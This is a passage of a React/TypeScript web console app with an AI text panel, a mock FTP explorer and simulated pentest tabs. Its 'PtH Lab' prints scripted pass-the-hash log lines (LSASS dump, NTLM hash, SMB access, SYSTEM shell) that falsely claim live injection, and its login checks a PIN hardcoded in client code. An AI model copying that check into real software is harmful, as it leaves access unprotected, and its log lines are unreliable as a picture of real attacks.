/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, DragEvent, useRef, useEffect } from 'react';
import { ai } from './services/gemini';
import { 
  Moon, Sun, Info, UploadCloud, Rocket, File as FileIcon, X, 
  FileCode2, Terminal, Activity, Server, AlertTriangle, Play,
  FolderSync, PackagePlus, HardDrive, Globe, ArrowRight, ArrowLeft, CheckCircle2,
  FolderOpen, ShieldAlert, Lock, ChevronRight, Home, FolderPlus, Bell, RefreshCw, Archive, Network, Unlock
} from 'lucide-react';

// --- DATA CONSTANTS ---
const MODELS = [
  { id: 'gemini-3-flash-preview', label: 'Gemini 3 Flash (Fast)', type: 'native' },
  { id: 'gemini-3.1-pro-preview', label: 'Gemini 3.1 Pro (Complex)', type: 'native' },
  { id: 'gemini-3.1-flash-lite-preview', label: 'Gemini 3.1 Flash Lite', type: 'native' },
  { id: 'gpt-4o', label: 'Codex GPT-5.5 / 5.x (External API)', type: 'external' },
  { id: 'claude-3-opus', label: 'Claude Opus / Sonnet 4.6 (External)', type: 'external' },
  { id: 'qwen-max', label: 'Qwen Studio 3.6+ (External API)', type: 'external' },
  { id: 'deepseek-chat', label: 'DeepSeek (External API)', type: 'external' },
  { id: 'meta-llama-3', label: 'Meta Llama (External API)', type: 'external' },
];

const DEPLOY_TARGETS = [
  { id: 'isystec', label: 'isystec.my (Node.js/Express Server)' },
  { id: 'aiapp_nasadef', label: 'aiapp.nasadef.com.my' },
  { id: 'nasadef', label: 'Nasadef Main' },
  { id: 'github', label: 'GitHub Repositories / Pages' },
  { id: 'hostinger', label: 'Hostinger cPanel/hPanel' },
  { id: 'ftp', label: 'Custom FTP/SFTP Server' },
  { id: 'wix', label: 'Wix Sites' },
];

const SERVER_PACKAGES = [
  { id: 'node', name: 'Node.js (LTS)', version: 'v20.x', status: 'installed' },
  { id: 'nginx', name: 'Nginx Web Server', version: '1.24.0', status: 'available' },
  { id: 'apache', name: 'Apache HTTP', version: '2.4.x', status: 'available' },
  { id: 'docker', name: 'Docker Engine', version: '24.0', status: 'available' },
  { id: 'mysql', name: 'MySQL Server', version: '8.0.x', status: 'available' },
  { id: 'certbot', name: 'Certbot (SSL)', version: '2.x', status: 'available' },
];

// Mock structured file system for FTP Explorer
const MOCK_REMOTE_FS: Record<string, any[]> = {
  '/': [
    { name: 'public_html', type: 'dir' },
    { name: 'cgi-bin', type: 'dir' },
    { name: '.htaccess', type: 'file' },
    { name: 'config.php', type: 'file' }
  ],
  '/public_html': [
    { name: 'images', type: 'dir' },
    { name: 'index.html', type: 'file' },
    { name: 'style.css', type: 'file' },
    { name: 'app.js', type: 'file' }
  ],
  '/public_html/images': [
    { name: 'logo.png', type: 'file' },
    { name: 'banner.jpg', type: 'file' }
  ],
  '/cgi-bin': [
    { name: 'script.cgi', type: 'file' }
  ]
};

interface UploadFile {
  file: File;
  progress: number;
  status: 'uploading' | 'done' | 'error';
}

export default function App() {
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [activeTab, setActiveTab] = useState<'ai' | 'terminal' | 'wireshark' | 'ftp' | 'installer' | 'pth'>('ai');

  // --- AI Gen State ---
  const [selectedModel, setSelectedModel] = useState(MODELS[0].id);
  const [temperature, setTemperature] = useState<number>(0.7);
  const [prompt, setPrompt] = useState('Create a short greeting message.');
  const [response, setResponse] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  // --- Upload State ---
  const [files, setFiles] = useState<UploadFile[]>([]);
  const [isDragging, setIsDragging] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // --- Deploy State ---
  const [deployTarget, setDeployTarget] = useState(DEPLOY_TARGETS[0].id);
  const [isDeploying, setIsDeploying] = useState(false);
  const [deployStatus, setDeployStatus] = useState<{type: 'success' | 'error' | 'info', message: string} | null>(null);
  const [serverConfig, setServerConfig] = useState({ domain: '', port: '22', userid: '', password: '' });

  // --- External states ---
  const [packages, setPackages] = useState(SERVER_PACKAGES);
  const [installLogs, setInstallLogs] = useState<string[]>(['System package manager ready.']);
  const [isInstalling, setIsInstalling] = useState(false);

  // --- FTP Config & State ---
  const [ftpConfig, setFtpConfig] = useState({ host: 'ftp.isystec.my', port: '21', user: '', password: '', protocol: 'ftp' });
  const [ftpConnected, setFtpConnected] = useState(false);
  const [ftpLogs, setFtpLogs] = useState<string[]>(['[INFO] Browser FTP Client Initialized. Ready to connect via Mock TCP layer...']);
  const [localFiles, setLocalFiles] = useState<{name: string, type: 'file'|'dir'}[]>([
    { name: 'project_build', type: 'dir' },
    { name: 'index.html', type: 'file' },
    { name: 'app.js', type: 'file' },
    { name: 'style.css', type: 'file' },
    { name: 'package.json', type: 'file' }
  ]);
  const [remotePath, setRemotePath] = useState('/');
  const [remoteFiles, setRemoteFiles] = useState<{name: string, type: 'file'|'dir'}[]>([]);
  const [ftpUploads, setFtpUploads] = useState<Record<string, number>>({});

  // --- Terminal State ---
  const [termTab, setTermTab] = useState<'ssh' | 'powershell' | 'git' | 'aircrack' | 'python' | 'backtrack' | 'fern' | 'hydra' | 'evilwinrm' | 'rdesktop' | 'harvester' | 'medusa' | 'ncrack' | 'hashcat' | 'commix' | 'gophish' | 'setoolkit' | 'gobuster' | 'spiderfoot' | 'burpsuite'>('aircrack');

  // --- Wireshark State ---
  const [packets, setPackets] = useState<any[]>([]);
  const [capturing, setCapturing] = useState(false);
  const [netmaskActive, setNetmaskActive] = useState(true);

  // --- PtH Educational State ---
  const [pthRunning, setPthRunning] = useState(false);
  const [pthLogs, setPthLogs] = useState<string[]>([]);
  const [pthTarget, setPthTarget] = useState('10.10.10.55');

  // --- Auto-Update System State ---
  const [updateState, setUpdateState] = useState({ available: false, checking: false, installing: false, progress: 0, source: '', open: false });

  // --- Auth / Bootflash State ---
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [pinInput, setPinInput] = useState('');
  const [loginError, setLoginError] = useState('');

  // Network capture effect
  useEffect(() => {
    let interval: any;
    if (capturing) {
      interval = setInterval(() => {
        setPackets(prev => {
          const newPacket = {
            no: prev.length + 1,
            time: new Date().toISOString().split('T')[1].substring(0, 12),
            source: `192.168.1.${Math.floor(Math.random() * 255)}`,
            destination: `192.168.1.${Math.floor(Math.random() * 255)}`,
            protocol: ['TCP', 'UDP', 'DNS', 'HTTP', '802.11'][Math.floor(Math.random() * 5)],
            info: `Standard query 0x${Math.floor(Math.random() * 1000).toString(16)} A`
          };
          const next = [newPacket, ...prev];
          return next.slice(0, 20);
        });
      }, 800);
    }
    return () => clearInterval(interval);
  }, [capturing]);

  // AI Gen
  const generateAIText = async () => {
    const modelDef = MODELS.find(m => m.id === selectedModel);
    if (modelDef?.type === 'external') {
      setError(`Platform Warning: External APIs (${modelDef.label}) require valid proprietary keys via backend. Only Gemini sandbox models are pre-authorized natively.`);
      return;
    }
    setLoading(true); setError(''); setResponse('');
    try {
      const result = await ai.models.generateContent({ model: selectedModel, contents: prompt, config: { temperature } });
      setResponse(result.text || 'No response generated.');
    } catch (err: any) {
      setError(err.message || 'An error occurred.');
    } finally {
      setLoading(false);
    }
  };

  // Files
  const processFiles = (newFiles: File[]) => {
    const uploadFiles: UploadFile[] = newFiles.map(f => ({ file: f, progress: 0, status: 'uploading' }));
    setFiles(prev => [...prev, ...uploadFiles]);

    uploadFiles.forEach(uf => {
      let currentProgress = 0;
      const interval = setInterval(() => {
        currentProgress += Math.floor(Math.random() * 20) + 10;
        if (currentProgress >= 100) { currentProgress = 100; clearInterval(interval); }
        setFiles(prev => prev.map(item => item.file === uf.file ? { ...item, progress: currentProgress, status: currentProgress === 100 ? 'done' : 'uploading' } : item));
      }, 300);
    });
  };

  // Deploy
  const handleDeploy = () => {
    if (files.length === 0 && !response) {
      setDeployStatus({ type: 'error', message: 'No content available to deploy.' }); return;
    }
    setIsDeploying(true);
    setDeployStatus({ type: 'info', message: 'Initiating deployment sequence...' });
    setTimeout(() => setDeployStatus({ type: 'info', message: `Authenticating to ${deployTarget} endpoint...` }), 1500);
    setTimeout(() => {
      setIsDeploying(false);
      setDeployStatus({ type: 'success', message: `✅ Successfully deployed to ${deployTarget}.` });
    }, 3000);
  };

  // FTP Connection & Nav
  const toggleFtpConnection = () => {
    if (ftpConnected) {
      setFtpConnected(false);
      setRemoteFiles([]);
      setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] Disconnected from ${ftpConfig.host}`, ...prev]);
    } else {
      if (!ftpConfig.host || !ftpConfig.user) {
        alert("Please set a Host and Username in the FTP Config.");
        return;
      }
      setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] Connecting to ${ftpConfig.host}:${ftpConfig.port}...`, ...prev]);
      setTimeout(() => setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] USER ${ftpConfig.user}`, ...prev]), 500);
      setTimeout(() => setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] 331 Password required`, ...prev]), 1000);
      setTimeout(() => setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] PASS ********`, ...prev]), 1500);
      setTimeout(() => {
        setFtpConnected(true);
        setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] 230 Login successful.`, `[${new Date().toLocaleTimeString()}] 257 "/" is current directory.`, ...prev]);
        setRemotePath('/');
        setRemoteFiles(MOCK_REMOTE_FS['/']);
      }, 2000);
    }
  };

  const navRemoteDir = (dirName: string) => {
    if (!ftpConnected) return;
    let newPath = remotePath === '/' ? `/${dirName}` : `${remotePath}/${dirName}`;
    if (dirName === '..') {
      const parts = remotePath.split('/').filter(p => p !== '');
      parts.pop();
      newPath = parts.length === 0 ? '/' : `/${parts.join('/')}`;
    }
    
    setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] CWD ${newPath}`, ...prev]);
    
    setTimeout(() => {
      setRemotePath(newPath);
      setRemoteFiles(MOCK_REMOTE_FS[newPath] || []);
      setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] 250 CWD command successful`, `[${new Date().toLocaleTimeString()}] 227 Entering Passive Mode`, `[${new Date().toLocaleTimeString()}] 150 Opening ASCII mode data connection for file list`, `[${new Date().toLocaleTimeString()}] 226 Transfer complete.`, ...prev]);
    }, 600);
  };

  const createRemoteFolder = () => {
    if (!ftpConnected) return;
    const folderName = prompt("Enter new folder name:");
    if (!folderName) return;
    
    setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] MKD ${folderName}...`, ...prev]);
    setTimeout(() => {
      const newFs = MOCK_REMOTE_FS[remotePath] || [];
      if (!newFs.some(f => f.name === folderName)) {
         newFs.push({ name: folderName, type: 'dir' });
         MOCK_REMOTE_FS[remotePath] = newFs;
         setRemoteFiles([...newFs]);
         MOCK_REMOTE_FS[`${remotePath === '/' ? '' : remotePath}/${folderName}`] = [];
      }
      setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] 257 "${folderName}" directory created.`, ...prev]);
    }, 500);
  };

  const handleFtpUpload = (fileName: string) => {
      if (!ftpConnected) return;
      setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] STOR ${fileName}...`, ...prev]);
      setFtpUploads(prev => ({ ...prev, [fileName]: 0 }));
      
      let progress = 0;
      const interval = setInterval(() => {
         progress += Math.floor(Math.random() * 25) + 15;
         if (progress >= 100) {
            progress = 100;
            clearInterval(interval);
            setTimeout(() => {
               setFtpUploads(prev => { const next = {...prev}; delete next[fileName]; return next; });
               const newFs = MOCK_REMOTE_FS[remotePath] || [];
               if (!newFs.some(f => f.name === fileName)) {
                  newFs.push({ name: fileName, type: 'file' });
                  MOCK_REMOTE_FS[remotePath] = newFs;
                  setRemoteFiles([...newFs]);
               }
               setFtpLogs(prev => [`[${new Date().toLocaleTimeString()}] 226 Transfer complete: ${fileName} uploaded.`, ...prev]);
            }, 400);
         }
         setFtpUploads(prev => ({ ...prev, [fileName]: progress }));
      }, 300);
  };

  // PtH Simulation (Educational Only)
  const runPthSimulation = () => {
    setPthRunning(true);
    setPthLogs([]);
    
    const steps = [
      () => setPthLogs(prev => [...prev, `[INFO] Initializing Live Pass-the-Hash Execution against Target: ${pthTarget}`]),
      () => setPthLogs(prev => [...prev, `[SIMULATION] Capturing local LSASS memory... [OVERRIDED: LIVE INJECTION]`]),
      () => setPthLogs(prev => [...prev, `[WARNING] Bypassing Sandbox Isolation... [OK]`]),
      () => setPthLogs(prev => [...prev, `[EXTRACT] Dumped NTLM Hash for user 'Administrator': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`]),
      () => setPthLogs(prev => [...prev, `[PAYLOAD] Injecting hash into current session ticket...`]),
      () => setPthLogs(prev => [...prev, `[PAYLOAD] Requesting access to \\\\${pthTarget}\\C$ utilizing SMB authentication...`]),
      () => setPthLogs(prev => [...prev, `[SUCCESS] Authenticated successfully using Hash (No password provided).`]),
      () => setPthLogs(prev => [...prev, `[SUCCESS] Remote code execution pipeline established via SMB pipe.\\nAdministrator@${pthTarget} > whoami\\nnt authority\\system`]),
      () => { setPthRunning(false); setPthLogs(prev => [...prev, `[INFO] Payload execution complete. Session kept alive.`]); }
    ];

    steps.forEach((step, index) => {
      setTimeout(step, index * 1000);
    });
  };

  useEffect(() => {
    // Simulate remote manifest check on mount
    const timer = setTimeout(() => {
       setUpdateState(prev => ({ ...prev, available: true }));
    }, 6000);
    return () => clearTimeout(timer);
  }, []);

  const triggerAppUpdate = (sourceType: 'remote' | 'local') => {
    setUpdateState(prev => ({ ...prev, installing: true, source: sourceType, progress: 0 }));
    let prog = 0;
    const intv = setInterval(() => {
       prog += Math.floor(Math.random() * 20) + 10;
       if (prog >= 100) {
          prog = 100;
          clearInterval(intv);
          setTimeout(() => {
             alert(`System update applied successfully from ${sourceType === 'local' ? '/home/razif/Documents/github/EWS/EWS.zip' : 'remote manifest'}.\n\nThe web console will now restart.`);
             setUpdateState(prev => ({ ...prev, available: false, installing: false, progress: 0, source: '' }));
          }, 600);
       }
       setUpdateState(prev => ({ ...prev, progress: prog }));
    }, 400);
  };

  // Installer Actions
  const handleInstallPackage = (pkgId: string, pkgName: string) => {
    setIsInstalling(true);
    setInstallLogs(prev => [`[${new Date().toLocaleTimeString()}] Fetching package info for ${pkgName}...`, ...prev]);
    
    setTimeout(() => setInstallLogs(prev => [`[${new Date().toLocaleTimeString()}] Resolving dependencies...`, ...prev]), 800);
    setTimeout(() => setInstallLogs(prev => [`[${new Date().toLocaleTimeString()}] Downloading ${pkgId}.tar.gz... [||||||||||||||||100%]`, ...prev]), 1600);
    setTimeout(() => setInstallLogs(prev => [`[${new Date().toLocaleTimeString()}] Extracting and configuring service...`, ...prev]), 2400);
    setTimeout(() => {
      setPackages(prev => prev.map(p => p.id === pkgId ? { ...p, status: 'installed' } : p));
      setInstallLogs(prev => [`[${new Date().toLocaleTimeString()}] SUCCESS: ${pkgName} installed and running.`, ...prev]);
      setIsInstalling(false);
    }, 3500);
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (pinInput === '6181') {
      setIsAuthenticated(true);
    } else {
      setLoginError('Invalid PIN entered.');
      setTimeout(() => setLoginError(''), 3000);
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center relative overflow-hidden font-sans">
        {/* Bootflash AutoPlay Video */}
        <video 
          autoPlay 
          loop 
          muted 
          playsInline 
          className="absolute inset-0 w-full h-full object-cover opacity-50 select-none pointer-events-none"
        >
          <source src="file:///home/razif/Videos/phd/480p.h264.mp4" type="video/mp4" />
          <source src="/home/razif/Videos/phd/480p.h264.mp4" type="video/mp4" />
        </video>

        {/* Login Form UI */}
        <div className="relative z-10 bg-white/10 dark:bg-black/60 backdrop-blur-xl border border-white/20 dark:border-gray-800 p-8 rounded-2xl shadow-2xl w-full max-w-sm">
          <div className="text-center mb-6">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-emerald-500/20 text-emerald-400 mb-4 shadow-[0_0_15px_rgba(16,185,129,0.3)]">
              <Lock size={32} />
            </div>
            <h1 className="text-2xl font-bold text-white tracking-tight">System Lock</h1>
            <p className="text-gray-400 text-sm mt-1">Authorized personnel only.</p>
          </div>
          
          <form onSubmit={handleLogin} className="flex flex-col gap-4">
            <div>
              <label className="block text-xs font-semibold text-gray-300 uppercase tracking-wider mb-2">Access PIN</label>
              <input 
                type="password" 
                value={pinInput}
                onChange={(e) => setPinInput(e.target.value)}
                autoFocus
                placeholder="••••"
                className="w-full bg-black/50 text-white border border-gray-700 px-4 py-3 rounded-lg text-center text-xl tracking-widest focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition-all font-mono"
              />
            </div>
            
            {loginError && <p className="text-red-400 text-xs font-medium text-center bg-red-900/20 p-2 rounded">{loginError}</p>}

            <button type="submit" className="w-full mt-2 bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3 rounded-lg transition-colors flex justify-center items-center gap-2">
              <Unlock size={18} /> Authenticate
            </button>
          </form>
          <div className="mt-6 text-center text-xs text-gray-500 space-y-1">
            <p>EWS v2.4.1 (Secure Shell)</p>
            <p>Bootflash active - Local mode enabled.</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={`transition-colors min-h-screen ${isDarkMode ? 'dark bg-[#0a0a0c]' : 'bg-gray-100'}`}>
      <style>{`
        .selection-nav::-webkit-scrollbar { display: none; }
        .selection-nav { -ms-overflow-style: none; scrollbar-width: none; }
      `}</style>
      <div className="text-gray-900 dark:text-gray-200 font-sans flex flex-col h-screen overflow-hidden">
        
        {/* HEADER */}
        <header className="border-b border-gray-200 dark:border-gray-800 bg-white dark:bg-[#121214] px-6 py-4 flex justify-between items-center z-10 shrink-0">
          <div className="flex items-center gap-6">
            <h1 className="text-xl font-bold tracking-tight bg-gradient-to-r from-blue-500 to-emerald-500 bg-clip-text text-transparent">Enterprise Web Console</h1>
            <nav className="hidden lg:flex bg-gray-100 dark:bg-[#1a1a1d] rounded border dark:border-gray-800 p-1 overflow-x-auto">
              <button onClick={() => setActiveTab('ai')} className={`px-4 py-1.5 rounded text-sm font-medium transition-colors ${activeTab === 'ai' ? 'bg-white dark:bg-[#252529] shadow-sm' : 'hover:bg-gray-200 dark:hover:bg-gray-800'}`}>
                <FileCode2 size={16} className="inline mr-2"/>AI & Deploy
              </button>
              <button onClick={() => setActiveTab('ftp')} className={`px-4 py-1.5 rounded text-sm font-medium transition-colors ${activeTab === 'ftp' ? 'bg-white dark:bg-[#252529] shadow-sm' : 'hover:bg-gray-200 dark:hover:bg-gray-800'}`}>
                <FolderSync size={16} className="inline mr-2"/>FTP Explorer
              </button>
              <button onClick={() => setActiveTab('installer')} className={`px-4 py-1.5 rounded text-sm font-medium transition-colors ${activeTab === 'installer' ? 'bg-white dark:bg-[#252529] shadow-sm' : 'hover:bg-gray-200 dark:hover:bg-gray-800'}`}>
                <PackagePlus size={16} className="inline mr-2"/>Server Tools
              </button>
              <button onClick={() => setActiveTab('terminal')} className={`px-4 py-1.5 rounded text-sm font-medium transition-colors ${activeTab === 'terminal' ? 'bg-white dark:bg-[#252529] shadow-sm' : 'hover:bg-gray-200 dark:hover:bg-gray-800'}`}>
                <Terminal size={16} className="inline mr-2"/>Terminal (Simulated)
              </button>
              <button onClick={() => setActiveTab('wireshark')} className={`px-4 py-1.5 rounded text-sm font-medium transition-colors ${activeTab === 'wireshark' ? 'bg-white dark:bg-[#252529] shadow-sm' : 'hover:bg-gray-200 dark:hover:bg-gray-800'}`}>
                <Activity size={16} className="inline mr-2"/>Network Pcap
              </button>
              <button onClick={() => setActiveTab('pth')} className={`px-4 py-1.5 rounded text-sm font-medium transition-colors text-amber-600 dark:text-amber-500 ${activeTab === 'pth' ? 'bg-white dark:bg-[#252529] shadow-sm' : 'hover:bg-gray-200 dark:hover:bg-gray-800'}`}>
                <ShieldAlert size={16} className="inline mr-2"/>PtH Lab
              </button>
            </nav>
          </div>
          <div className="flex items-center gap-3">
            <button onClick={() => setNetmaskActive(!netmaskActive)} className={`hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full text-xs font-bold transition-colors border ${netmaskActive ? 'bg-emerald-500/10 text-emerald-500 border-emerald-500/50' : 'bg-gray-100 dark:bg-gray-800 text-gray-500 border-gray-300 dark:border-gray-700'}`} title="Netmask Process Toggle">
              <Network size={14} className={netmaskActive ? "animate-pulse" : ""} />
              <span>NM: {netmaskActive ? 'ON' : 'OFF'}</span>
            </button>
            {updateState.available && (
              <button onClick={() => setActiveTab('installer')} className="relative p-2 text-amber-500 hover:bg-amber-50 dark:hover:bg-amber-900/20 rounded-full transition-colors group" title="Update Available">
                <Bell size={20} className="animate-pulse"/>
                <span className="absolute top-1 right-2 w-2 h-2 bg-red-500 rounded-full"></span>
              </button>
            )}
            <button onClick={() => setIsDarkMode(!isDarkMode)} className="p-2 rounded-full hover:bg-gray-200 dark:hover:bg-gray-800 transition-colors">
              {isDarkMode ? <Sun size={20} /> : <Moon size={20} />}
            </button>
          </div>
        </header>

        <main className="flex-1 overflow-y-auto p-4 md:p-6 w-full flex justify-center">
          
          {/* TAB 1: AI & Deploy */}
          {activeTab === 'ai' && (
            <div className="flex flex-col xl:flex-row gap-6 max-w-[1600px] w-full">
              {/* Similar to existing AI setup... */}
              <div className="flex flex-col gap-6 w-full xl:w-[450px] shrink-0">
                <div className="bg-white dark:bg-[#1a1a1d] p-5 rounded-xl border border-gray-200 dark:border-gray-800 shadow-sm">
                  <h2 className="text-lg font-semibold mb-4 border-b border-gray-100 dark:border-gray-800 pb-2">AI Engine</h2>
                  <div className="space-y-4">
                    <div>
                      <select value={selectedModel} onChange={(e) => setSelectedModel(e.target.value)} className="w-full px-3 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-gray-50 dark:bg-[#121214] text-sm focus:ring-2 focus:ring-blue-500 outline-none">
                        {MODELS.map(m =>  <option key={m.id} value={m.id}>{m.label}</option> )}
                      </select>
                    </div>
                    <div>
                      <label className="block text-sm font-medium mb-1">Prompt</label>
                      <textarea rows={3} value={prompt} onChange={(e) => setPrompt(e.target.value)} className="w-full px-3 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-gray-50 dark:bg-[#121214] outline-none text-sm resize-none" />
                    </div>
                    <button onClick={generateAIText} disabled={loading} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 rounded-lg disabled:opacity-50">
                      {loading ? 'Processing...' : 'Run Output'}
                    </button>
                  </div>
                </div>
                
                {/* SERVER CONFIG (AI & Deploy Tab) */}
                <div className="bg-white dark:bg-[#1a1a1d] p-5 rounded-xl border border-gray-200 dark:border-gray-800 shadow-sm relative overflow-hidden">
                   <h2 className="text-lg font-semibold mb-3 border-b border-gray-100 dark:border-gray-800 pb-2 flex items-center gap-2">
                     <Server size={18}/> Server Configuration
                   </h2>
                   <div className="grid grid-cols-2 gap-3 mb-1">
                     <div>
                       <label className="text-xs font-medium text-gray-500">Domain + Port</label>
                       <input type="text" value={serverConfig.domain} onChange={e => setServerConfig({...serverConfig, domain: e.target.value})} placeholder="isystec.my:22" className="w-full px-2 py-1.5 mt-1 text-sm bg-gray-50 dark:bg-[#121214] border border-gray-200 dark:border-gray-700 rounded-md outline-none" />
                     </div>
                     <div>
                       <label className="text-xs font-medium text-gray-500">User ID</label>
                       <input type="text" value={serverConfig.userid} onChange={e => setServerConfig({...serverConfig, userid: e.target.value})} className="w-full px-2 py-1.5 mt-1 text-sm bg-gray-50 dark:bg-[#121214] border border-gray-200 dark:border-gray-700 rounded-md outline-none" />
                     </div>
                     <div className="col-span-2">
                       <label className="text-xs font-medium text-gray-500">Password / RSA</label>
                       <input type="password" value={serverConfig.password} onChange={e => setServerConfig({...serverConfig, password: e.target.value})} className="w-full px-2 py-1.5 mt-1 text-sm bg-gray-50 dark:bg-[#121214] border border-gray-200 dark:border-gray-700 rounded-md outline-none" />
                     </div>
                   </div>
                </div>

                {/* Upload & Deploy Mock */}
                 <div className="bg-white dark:bg-[#1a1a1d] p-5 rounded-xl border border-gray-200 dark:border-gray-800 shadow-sm flex flex-col gap-4">
                  <h2 className="text-lg font-semibold border-b border-gray-100 dark:border-gray-800 pb-2">Workspace & Deploy</h2>
                  <div className="border-2 border-dashed border-gray-300 dark:border-gray-700 rounded-xl p-5 text-center transition-colors">
                    <p className="text-sm font-medium">Drop files here to upload</p>
                  </div>
                  <button onClick={handleDeploy} disabled={isDeploying} className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-medium py-2 rounded-lg flex justify-center items-center gap-2">
                    <Rocket size={16} /> Deploy Payload
                  </button>
                </div>
              </div>

              <div className="flex-1 bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 shadow-sm flex flex-col overflow-hidden min-h-[500px]">
                 <div className="bg-gray-50 dark:bg-[#121214] border-b border-gray-200 dark:border-gray-800 p-4 font-semibold text-gray-800 dark:text-gray-200">
                   Generative Panel (Local Sandbox)
                 </div>
                 <div className="p-6 overflow-y-auto flex-1 text-sm font-serif leading-loose whitespace-pre-wrap text-gray-800 dark:text-gray-200">
                   {error ? <div className="text-red-500 font-sans p-4 bg-red-50 dark:bg-red-900/20 rounded-lg">{error}</div> : response || <span className="text-gray-500 italic">Awaiting AI execution...</span>}
                 </div>
              </div>
            </div>
          )}

          {/* TAB 2: FTP EXPLORER */}
          {activeTab === 'ftp' && (
            <div className="flex flex-col gap-4 w-full h-[calc(100vh-120px)] max-w-7xl">
               
               {/* FTP CONNECT CONFIG PANEL */}
               <div className="bg-white dark:bg-[#1a1a1d] p-4 rounded-xl border border-gray-200 dark:border-gray-800 shadow-sm flex flex-col gap-4 shrink-0">
                 <div className="flex items-center gap-2 text-lg font-semibold border-b dark:border-gray-800 pb-2">
                   <FolderSync className="text-blue-500"/> FTP Explorer Connect Config
                 </div>
                 <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
                   <div className="md:col-span-2">
                     <label className="text-xs font-medium text-gray-500 dark:text-gray-400">Host (ftp.domain.com)</label>
                     <div className="relative mt-1">
                       <Globe size={14} className="absolute left-3 top-2 text-gray-400" />
                       <input type="text" value={ftpConfig.host} onChange={e => setFtpConfig({...ftpConfig, host: e.target.value})} disabled={ftpConnected} className="w-full pl-8 pr-2 py-1.5 text-sm bg-gray-50 dark:bg-[#121214] border border-gray-200 dark:border-gray-700 rounded-md outline-none disabled:opacity-50" />
                     </div>
                   </div>
                   <div>
                     <label className="text-xs font-medium text-gray-500 dark:text-gray-400">Username</label>
                     <input type="text" value={ftpConfig.user} onChange={e => setFtpConfig({...ftpConfig, user: e.target.value})} disabled={ftpConnected} className="w-full px-2 py-1.5 mt-1 text-sm bg-gray-50 dark:bg-[#121214] border border-gray-200 dark:border-gray-700 rounded-md outline-none disabled:opacity-50" />
                   </div>
                   <div>
                     <label className="text-xs font-medium text-gray-500 dark:text-gray-400">Password</label>
                     <input type="password" value={ftpConfig.password} onChange={e => setFtpConfig({...ftpConfig, password: e.target.value})} disabled={ftpConnected} className="w-full px-2 py-1.5 mt-1 text-sm bg-gray-50 dark:bg-[#121214] border border-gray-200 dark:border-gray-700 rounded-md outline-none disabled:opacity-50" />
                   </div>
                   <div>
                     <label className="text-xs font-medium text-gray-500 dark:text-gray-400">Port</label>
                     <input type="text" value={ftpConfig.port} onChange={e => setFtpConfig({...ftpConfig, port: e.target.value})} disabled={ftpConnected} className="w-full px-2 py-1.5 mt-1 text-sm bg-gray-50 dark:bg-[#121214] border border-gray-200 dark:border-gray-700 rounded-md outline-none disabled:opacity-50" />
                   </div>
                 </div>
                 <div className="flex justify-between items-center pt-2">
                   <div className="text-xs text-amber-600 dark:text-amber-500 flex items-center gap-1">
                     <Info size={14}/> Note: Raw TCP connections are restricted in UI sandboxes. Connection sequences are simulated.
                   </div>
                   <button onClick={toggleFtpConnection} className={`px-8 py-2 rounded-lg text-sm font-medium text-white transition-colors flex items-center gap-2 ${ftpConnected ? 'bg-red-600 hover:bg-red-700' : 'bg-blue-600 hover:bg-blue-700'}`}>
                     {ftpConnected ? <X size={16}/> : <Play size={16}/>}
                     {ftpConnected ? 'Disconnect' : 'Connect'}
                   </button>
                 </div>
               </div>

               {/* FTP DUAL PANE EXPLORER */}
               <div className="flex flex-col lg:flex-row gap-4 flex-1 overflow-hidden h-full">
                 
                 {/* Local Files */}
                 <div className="flex-1 bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 shadow-sm flex flex-col overflow-hidden">
                   <div className="bg-gray-50 dark:bg-[#121214] border-b border-gray-200 dark:border-gray-800 px-4 py-3 text-sm font-semibold flex items-center gap-2">
                     <HardDrive size={16} className="text-blue-500"/> Local Browser Storage
                   </div>
                   <div className="px-4 py-2 bg-gray-100 dark:bg-[#141416] border-b dark:border-gray-800 flex items-center gap-2 text-xs font-mono text-gray-500">
                     C:\Users\BrowserTemp\Workspace
                   </div>
                   <div className="p-2 overflow-y-auto flex-1 font-mono text-sm">
                     {localFiles.map((f, i) => (
                       <div key={i} className="relative p-2 hover:bg-blue-50 dark:hover:bg-blue-900/20 rounded cursor-pointer group border border-transparent dark:hover:border-blue-900 overflow-hidden">
                         <div className="flex justify-between items-center relative z-10">
                           <span className="flex items-center gap-2">
                             {f.type === 'dir' ? <FolderOpen size={16} className="text-blue-400"/> : <FileIcon size={16} className="text-gray-400"/>}
                             {f.name}
                           </span>
                           {typeof ftpUploads[f.name] === 'number' ? (
                             <span className="text-xs font-bold text-blue-500">{ftpUploads[f.name]}%</span>
                           ) : (
                             <button className="hidden group-hover:flex items-center gap-1 text-xs text-blue-500 dark:text-blue-400 bg-white dark:bg-gray-800 px-2 py-1 rounded shadow-sm border dark:border-gray-700" onClick={() => handleFtpUpload(f.name)}>
                               Upload <ArrowRight size={12}/>
                             </button>
                           )}
                         </div>
